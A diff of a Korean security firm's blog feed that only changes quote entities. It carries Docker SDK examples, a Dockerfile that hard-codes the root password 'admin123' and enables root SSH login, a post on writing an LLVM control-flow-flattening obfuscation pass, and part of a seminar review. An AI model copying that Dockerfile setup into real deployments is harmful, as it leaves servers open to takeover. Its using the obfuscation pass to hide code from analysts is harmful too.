@@ -1571,15 +2288,15 @@ SAD는 Bureau 121의 소행으로 추정하고 있지만, 뒷덜미를 잡을만
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;Using echo command in alpine image&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;docker&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;alpine&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;echo hello world&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello world&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'alpine'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'echo hello world'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hello world&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;Managing your containers&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Container&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;45e6d2de7c54&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Container&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;db18e4f20eaa&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;45e6d2de7c54&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Config&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Image&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Container&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'45e6d2de7c54'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Container&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'db18e4f20eaa'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'45e6d2de7c54'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Config'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Image'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;&quot;bfirsh/reticulate-splines&quot;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;&quot;Reticulating spline 1...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
@@ -1611,7 +2328,7 @@ SAD는 Bureau 121의 소행으로 추정하고 있지만, 뒷덜미를 잡을만
 &lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; openssh-server vim
 
 &lt;span class=&quot;c&quot;&gt;# change root password&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;root:admin123&apos;&lt;/span&gt; | chpasswd
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root:admin123'&lt;/span&gt; | chpasswd
 
 &lt;span class=&quot;c&quot;&gt;# change ssh configure&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;PermitRootLogin &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/ssh/sshd_config &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; service ssh restart
@@ -1854,124 +2571,7 @@ if (successors == 1)
       &lt;td&gt;평면화 모듈 적용 후 흐름 그래프&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
-&lt;/table&gt;</content><author><name>조장현</name></author><category term="Dev" /><summary type="html">LLVM을 사용한 Control Flow Flattening 패스 개발 LLVM을 이용하여 난독화를 할 수 있으면 이를 기반으로 다양한 플랫폼에서 LLVM을 사용하여 빌드되는 코드들에 대한 공통 난독화 툴을 만들 수 있을 것이라고 생각하였습니다. 이를 위해 여러가지 난독화 및 암호화 패스를 개발하였고 이 글에서는 그 중 한 가지인 흐름 평면화 패스의 개발 과정에 대해 소개하겠습니다. LLVM이란 LLVM의 정식 명칭은 Low Level Virtual Machine입니다. 하지만 이 프로젝트의 핵심은 기존의 virtual machine 개념보다는 모듈화 되고 재사용 가능한 컴파일러 기술을 의미합니다. 그리고 이것은 target independent한 optimizer, target specific 한 어셈블리 코드를 생성하는 code generator 같은 컴파일러 도구들과 프로그래밍 언어와 어셈블리 코드 사이에 LLVM intermediate representation으로 알려진 LLVM IR이라는 중간 단계의 언어로 이루어져 있습니다. 이 글에서는 LLVM에서 모듈화된 컴파일러를 제작할 수 있는 구조인 패스를 통해 흐름 난독화를 하였습니다. Control Flow Flattening란 흐름 평면화, control flow flattening은 코드의 흐름을 평면화 시키는 난독화 기술입니다. Loop, conditional branch 같은 코드의 흐름을 전부 하나의 거대한 switch 문에 집어넣어서 모든 다른 블록으로의 이동이 단 하나의 블록으로부터 이루어지도록 만들어 코드를 분석하기 어렵게 만듭니다. 흐름 그래프가 마지막 사진과 같은 구조로 변경됩니다. 환경 구성 이 글에서는 llvm 13 버전을 바탕으로 LLVM을 빌드 하였습니다. 아래 cmake 명령이 정상적으로 실행된 후 ninja를 통해 빌드할 수 있습니다. LLVM 개발은 샘플 패스인 llvm/lib/Transforms/Hello를 덮어씌워 흐름 평면화를 위한 커스텀 패스를 개발하였습니다. cmake -G Ninja -DLLVM_PARALLEL_LINK_JOBS=1 -DCMAKE_BUILD_TYPE=Debug -DLLVM_ENABLE_PROJECTS=clang ../llvm-project/llvm 흐름 평면화 적용 시 발생하는 오류 LLVM에서 Function 클래스 아래에 존재하는 Basic Block들을 흐름 평면화의 개념에 따라 하나의 거대한 Switch Instruction 아래에 집어넣음으로써 구현해 낼 수 있습니다. 이처럼 수정을 시도할 경우 LLVM Verifier에서 수정된 내용이 유효한지 검증합니다. 흐름 그래프와 관련된 검증에는 preds라는 어떤 블록에서 이 블록으로 이동할 수 있는지에 대한 정보가 주로 사용되는데, 이와 관련된 아래 3가지 검증에서 오류가 자주 발생합니다. phi node의 경우 모든 케이스와 preds가 일치해야 한다. PHINode should have one entry for each predecessor of its parent basic block! %62 = phi i32 [ %30, %23 ], [ %35, %32 ], [ %40, %37 ], [ %60, %54 ], !dbg !1211 LLVM ERROR: Broken module found, compilation aborted! 블록 A에서 호출하는 변수는 entry block에서 블록 A에 도달하기 전에 정의되어야 한다. Instruction does not dominate all uses! %alloc = alloca i64, align 8 %load = load i64, i64* %alloc, align 8 LLVM ERROR: Broken module found, compilation aborted! Landingpad를 가진 블록은 반드시 invoke에 의해서 호출되어야 한다. Block containing LandingPadInst must be jumped to only by the unwind edge of an invoke. LLVM ERROR: Broken module found, compilation aborted! 이 문제들 중 1번과 2번은 opt에 기본으로 내장되어 있는 –reg2mem 옵션을 사용함으로써 대부분 해결할 수 있습니다. 이 옵션은 phi 노드들을 제거하고 모든 allocation을 entry block에서 하도록 수정해줍니다. 이를 적용함으로써 흐름 평면화를 진행하기 쉬워집니다. 다만 이 옵션을 적용하여도 남아있는 phi node가 있는 경우가 있어 이에 대한 예외처리를 해야 합니다. 3번의 경우 switch-case 블록에서 호출할 수 없기 때문에 예외처리를 해야 합니다. 평면화 코드 구현 우선 switch-case 문에서 호출할 수 있는 블록들을 확인해야합니다. Function 클래스에 iterator를 돌면서 위의 3번, LandingPad를 가졌는지 확인하고 아닌 것들을 벡터 형태로 수집합니다. Allocation이 이루어지는 블록은 따로 분리해 두어야 하기 때문에 entry block을 제거해주어야 합니다. vector&amp;lt;BasicBlock *&amp;gt; origBB; for (Function::iterator i = F.begin(); i != F.end(); ++i) { BasicBlock *block = &amp;amp;*i; if (!block-&amp;gt;isLandingPad()) { origBB.push_back(block); } } origBB.erase(origBB.begin()); return origBB; 그 다음 IRBuilder를 사용하여 Switch Instruction을 가지게 될 Basic Block을 만들어야 합니다. Switch 블록에는 default로 어떤 블록으로 점프할 것인지를 지정해 주어야 하는데 이것 역시 새로운 빈 블록, swDefault를 생성하여 지정해 주었습니다. BasicBlock *swDefault = BasicBlock::Create(Context, &quot;StealienCFGSwitchDefault&quot;, &amp;amp;F, *origBB.begin()); IRBuilder&amp;lt;&amp;gt; IRBswDefault(swDefault); IRBswDefault.CreateBr(*origBB.begin()); BasicBlock *startSwitch = BasicBlock::Create(Context, &quot;StealienCFGswitch&quot;, &amp;amp;F, swDefault); IRBuilder&amp;lt;&amp;gt; IRBswitch(startSwitch); 그 다음 Switch에서 사용할 변수를 Entry Block에서 allocation을 해 준 뒤, Switch 블록에서 이 값을 Value add로 가져오도록 설정합니다. AllocaInst *switchVar = new AllocaInst(llvm::Type::getInt64Ty(Context), AddrSpace, nullptr, AllocaAlign, &quot;&quot;, entryBlock-&amp;gt;getTerminator()); LoadInst *load = IRBswitch.CreateAlignedLoad(llvm::Type::getInt64Ty(Context), switchVar, MaybeAlign(8)); Value *add = IRBswitch.CreateAdd(load, ConstantInt::get(llvm::Type::getInt64Ty(Context), 762167)); 그 후 IRBSwitch에 Switch Instruction을 생성합니다. randomArr은 특정 범위의 수를 랜덤한 순서로 섞은 리스트이며, 이 값들을 사용해서 아래와 같이 case들을 추가해줍니다. switchI = IRBswitch.CreateSwitch(add, swDefault, randomArr[origBB.size()]); for (BasicBlock *setSwitchBlocks : origBB) { BasicBlock *selectedBlock = setSwitchBlocks; if(!this-&amp;gt;hasPHI(selectedBlock)) { ConstantInt *constCase = llvm::ConstantInt::get(llvm::Type::getInt64Ty(Context), randomArr[index]); switchI-&amp;gt;addCase(constCase, selectedBlock); } } 마지막으로 origBB에 있는 BasicBlock 들의 Terminator를 BranchInst인지 그리고 Successor 개수에 따라 분류할 수 있습니다. BranchInst는 1개 혹은 2개의 Successor를 가지며, 이것들이 수정 대상입니다. Branch Instruction이 아닌 경우 : return 혹은 unreachable 같은 종류되는 경우 혹은 invoke와 같이 수정이 불가능한 Terminating Instruction인 경우 Branch Instruction의 Successor가 1인 경우 : branch BlockA 같이 다른 블록으로 이동하는 경우 Branch Instruction의 Successor가 2인 경우 : branch condition BlockA BlockB 처럼 condition 값에 따라 이동하는 블록이 이동되는 경우 따라서 Branch Instruction에서 이동할 블록에 지정된 값을 Switch Instruction에서 찾아서 위에서 생성해둔 switchVar에 저장해주고 Switch Block으로 돌아가면 자동으로 이걸 로드해서 원하는 블록으로 이동하게 될 것입니다. Successor의 개수가 1인 경우에 대한 코드는 아래와 같습니다. 2인 경우에도 둘 다에 대해 동일하게 처리해주면 됩니다. 아래 코드에서는 Switch Instruction에서 가져온 intCase 값이 직접 드러나는 것을 숨기기 위해 추가적인 덧셈과 곱셈을 수행하도록 하였습니다. if(!isa&amp;lt;BranchInst&amp;gt;(selectedBlock-&amp;gt;getTerminator())){ continue; } uint64_t successors = selectedBlock-&amp;gt;getTerminator()-&amp;gt;getNumSuccessors(); if (successors == 1) { BasicBlock *follow = selectedBlock-&amp;gt;getTerminator()-&amp;gt;getSuccessor(0); ConstantInt *intCase = switchI-&amp;gt;findCaseDest(follow); if (intCase == NULL) { continue; } selectedBlock-&amp;gt;getTerminator()-&amp;gt;eraseFromParent(); IRBuilder&amp;lt;NoFolder&amp;gt; tempBuilder(selectedBlock); uint64_t origCase = intCase-&amp;gt;getSExtValue() - addVal; uint64_t randVal = 17+rand()%10000; Value * mul = tempBuilder.CreateMul(ConstantInt::get(llvm::Type::getInt64Ty(Context), origCase/randVal), ConstantInt::get(llvm::Type::getInt64Ty(Context), randVal)); Value * add = tempBuilder.CreateAdd(mul, ConstantInt::get(llvm::Type::getInt64Ty(Context), origCase%randVal)); tempBuilder.CreateAlignedStore(add, switchVar, MaybeAlign(8)); tempBuilder.CreateBr(startSwitch); } 전후비교 위와 같은 Control Flow Flattening 작업을 수행하면 아래와 같은 코드를 얻을 수 있습니다. Opt의 -dot-cfg 옵션을 사용하여 흐름 평면화 전용 전과 후를 비교하면 StealienCFGswitch 라는 Switch 블록이 추가된 것과 모든 블록이 다시 이 블록으로 돌아가는 난독화 기능이 적용된 것을 확인할 수 있습니다. 이러한 난독화 기능은 다른 난독화 기능들과 함께 적용하면 훨씬 더 분석하기 어려운 코드를 만들어 낼 수 있습니다. 기존 흐름 그래프 평면화 모듈 적용 후 흐름 그래프</summary></entry><entry xml:lang="ko"><title type="html">Stealien Security Seminar 1회 리뷰</title><link href="http://ufo.stealien.com/id/2022-06-30/stealien-security-seminar" rel="alternate" type="text/html" title="Stealien Security Seminar 1회 리뷰" /><published>2022-06-30T00:00:00+09:00</published><updated>2022-06-30T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-06-30/2022_3s_review-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-06-30/stealien-security-seminar">&lt;h1 id=&quot;stealien-security-seminar-1회-리뷰&quot;&gt;Stealien Security Seminar 1회 리뷰&lt;/h1&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/banner.png&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;Banner&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;안녕하세요! 저는 스틸리언의 김도현 선임연구원입니다.&lt;/p&gt;
-
-&lt;p&gt;2022년 6월 29일, 스틸리언에서 주관하는 첫 세미나가 성공적으로 진행되었습니다.&lt;/p&gt;
-
-&lt;p&gt;대망의 첫 세미나에서는 SSL&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 수료생 분들의 연구에 대해 소개하는 &lt;strong&gt;SSL 세션&lt;/strong&gt;과, 스틸리언 연구원들의 연구에 대해 소개하는 &lt;strong&gt;Open 세션&lt;/strong&gt; 그리고 오프라인에서만 진행하는 &lt;strong&gt;Secret 세션&lt;/strong&gt;이 있었는데요, 이번 세미나는 &lt;a href=&quot;https://www.youtube.com/watch?v=6YgSTZ9i7Vk&quot;&gt;유튜브를 통해 온라인&lt;/a&gt;으로도 송출하였기 때문에 혹시나 내용을 중간에 놓치셨거나, 시간이 없어 참석하지 못하신 분들은 다시보기를 통해 언제든 자유롭게 저희의 발표를 즐겨주시면 감사하겠습니다.&lt;/p&gt;
-
-&lt;p&gt;혹시나 아직 이번 세미나의 재미있는 발표 주제들을 듣지 못 하신분들을 위해서 이렇게 주제들에 대한 간단한 소개와 요약을 작성해 보았습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;open-static-vulnerability-analysis&quot;&gt;[Open] Static Vulnerability Analysis&lt;/h2&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/dhkim.jpg&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;발표 현장&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;세미나의 첫발은 제가 내디뎠습니다.&lt;/p&gt;
-
-&lt;p&gt;저의 주요 관심사 중 한가지는 다양한 어플리케이션 또는 임베디드 장비의 취약점을 찾는 것입니다.
-이런류의 버그바운티 또는 프로젝트를 해 보신분들은 잘 아시겠지만, 생각보다는 국내의 타겟들은 아직도 복잡도가 낮은 취약점들이 많이 나오고 있습니다.&lt;/p&gt;
-
-&lt;p&gt;이런 취약점들을 effortless하게 발굴하기 위해서 저는 Static Vulnerability Analysis 또는 Static Program Analysis for Vulnerability Research라는 방법을 이용했습니다. 이번 발표에서는 Static Vulnerability Analysis에 대한 기본적인 소개와, Fuzzing과 비교하여 이 기법의 장점과 단점에 대해 설명하고, 간단한 몇가지 테크닉에 대해 발표했습니다.&lt;/p&gt;
-
-&lt;p&gt;또한 마지막에는 소개드린 주제를 바탕으로 SSL 3기에서 진행할 내용에 대해 소개 드렸습니다.&lt;/p&gt;
-
-&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=1729&quot;&gt;28:49&lt;/a&gt;부터 저의 발표가 시작되니, 재미있게 들어주시면 감사하겠습니다 🤩&lt;/p&gt;
-
-&lt;h2 id=&quot;ssl-idapython으로-분석을-더-편하게-하는-방법&quot;&gt;[SSL] IDAPython으로 분석을 더 편하게 하는 방법&lt;/h2&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/snwo.jpg&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;발표 현장&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;두번째 발표는 SSL 2기 수료생 황선우님이 진행해 주셨습니다.&lt;/p&gt;
-
-&lt;p&gt;IDA Pro에서 제공하는 API를 이용하여 malware 분석, plugin에 대한 소개 및 CTF 문제를 IDAPython으로 해결하는 방법에 대해 소개 해 주셨습니다.
-특히 Windows OS의 application이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuleHandleA()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadLibraryA()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcAddress()&lt;/code&gt; chain을 이용해 binary에서 실행하고자 하는 procedure의 주소를 가져올 때, IDAPython을 이용하여 난독화 된 대상 library 및 procedure의 이름(문자열)을 복구할 수 있는 방법을 소개 해 주셨던 점이 저에게는 인상깊었습니다.&lt;/p&gt;
-
-&lt;p&gt;이후에는 &lt;a href=&quot;https://ctftime.org/event/1583&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b01lers CTF - TM&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://ctftime.org/task/20424&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCTF - Glade&lt;/code&gt;&lt;/a&gt; 문제를 직접 IDAPython을 이용하여 분석하는 예를 보여주시기도 하였습니다.&lt;/p&gt;
-
-&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=4105&quot;&gt;1:08:25&lt;/a&gt;부터 선우님의 발표가 시작되니, IDAPython의 강력한 기능을 이용해 보고 싶으신 분들은 한번 꼭 시청 해 보셔야겠네요 😎&lt;/p&gt;
-
-&lt;h2 id=&quot;ssl-권한-상승-취약점-분석-방법론--a&quot;&gt;[SSL] 권한 상승 취약점 분석 방법론 + a&lt;/h2&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/jhjang.jpg&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;발표 현장&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;세번째 발표 또한 SSL 2기 수료생 장재훈님이 진행해 주셨습니다.&lt;/p&gt;
-
-&lt;p&gt;장재훈님께서는 SSL 2기의 주제인 ‘권한 상승 취약점 분석 방법론’을 바탕으로 추가로 연구한 내용을 더해 이번 발표를 해 주셨습니다.
-방법론&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;에는 권한 상승 취약점을 관리적 측면, 기술적 측면으로 나누어 소개하고 있는데, 각 취약점에 대한 디테일이 더해져 보는 맛이 있는 발표였던 것 같습니다.&lt;/p&gt;
-
-&lt;p&gt;또한 이번 발표에는 ‘File Junction’, ‘Named Pipe Impersonation’ 등 개발자가 유의하지 않으면 발생하기 쉽고, 치명적인 버그 클래스들에 대해서도 소개 해 주셨습니다.&lt;/p&gt;
-
-&lt;p&gt;요즘의 시스템들은 권한 분리가 잘 되어있는 경우가 많아지고 있지만, 권한이 분리 된 환경에서도 여전히 실수가 발생하면 성공적으로 공격을 수행시킬 수 있다는 사실을 이번 발표를 통해 잘 보여주신 것 같습니다.&lt;/p&gt;
-
-&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=7145&quot;&gt;1:59:05&lt;/a&gt;부터 재훈님의 발표가 시작됩니다. SSL을 통해 어떤 프로젝트를 진행하며 뭘 배워갈 수 있을지에 대해 궁금하신 분들은 한번 시청 해 보시는 것을 추천 드립니다! 👏&lt;/p&gt;
-
-&lt;h2 id=&quot;open-모던-웹-환경에서의-버그케이스와-시큐어코딩&quot;&gt;[Open] 모던 웹 환경에서의 버그케이스와 시큐어코딩&lt;/h2&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/scyoon.jpg&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;발표 현장&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;네번째 발표는 저희 회사에서 많은 귀여움을 받고 있는 윤석찬 선임 연구원이 발표 해 주셨습니다.&lt;/p&gt;
-
-&lt;p&gt;윤석찬 연구원은 점점 스택이 높게 쌓여지는 모던 웹 어플리케이션에서 어떤 방식의 취약점을 찾을 수 있고, 이를 보완하는 방법에 대해 소개해 주셨습니다. 눈높이에 맞춰 하나씩 차근차근 알려주는 윤석찬 연구원의 스윗함에 빠질것 같았지만 겨우겨우 살아 돌아왔네요. 이 발표는 윤석찬 연구원이 직접 여러 프로젝트를 진행하며 배운 내용을 바탕으로 하고 있으니, 굉장히 practical한 발표라고 볼 수도 있겠네요!&lt;/p&gt;
-
-&lt;p&gt;백엔드, 프론트엔드에서 발생할 수 있는 일반적인 취약점들과, Django, React.js와 같은 특정한 플랫폼, 프레임워크에서만 발생할 수 있는 취약점들을 잘 알려 주셔서 너무 좋았다는 평이 가득합니다.&lt;/p&gt;
-
-&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=10110&quot;&gt;2:48:30&lt;/a&gt;부터 석찬님의 발표가 시작됩니다. 평소 CTF를 통해 웹해킹은 어느정도 할 수 있지만, real-world에 입문하고 싶은 웹해커들에게 이 발표를 추천하는 바입니다. 🐞&lt;/p&gt;
-
-&lt;h2 id=&quot;open-mev&quot;&gt;[Open] MEV&lt;/h2&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/hjhan.jpg&quot; /&gt;&lt;br /&gt;
-    &lt;i&gt;발표 현장&lt;/i&gt;
-&lt;/p&gt;
-
-&lt;p&gt;다섯번째 발표는 스틸리언의 한호정 연구원님이 진행해주셨습니다&lt;/p&gt;
-
-&lt;p&gt;한호정 연구원님은 해당 발표에서 Blockchain에 대한 취약점 분석 외에 MEV(Miner Extractable Value)에 대해서 소개해주셨습니다
